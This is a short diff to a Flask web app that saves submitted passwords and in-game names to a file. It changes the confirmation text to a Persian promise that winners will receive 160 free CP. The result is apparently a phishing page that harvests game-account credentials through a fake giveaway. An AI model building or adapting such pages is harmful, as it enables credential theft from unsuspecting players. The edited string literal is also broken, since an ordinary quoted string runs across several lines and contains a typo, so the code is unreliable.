@@ -36,7 +36,12 @@ def submit():
         f.write(f"رمز عبور: {password}\n")
         f.write(f"نام در بازی: {gamename}\n")
 
-    return render_template('index.html', message="اطلاعات با موفقیت ذخیره شد ✅")
+    return render_template('index.html', message="افرم شما با موفقیت ثبت گردید.
+در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.
+
+
+")
 
 if __name__ == '__main__':
+
     app.run()
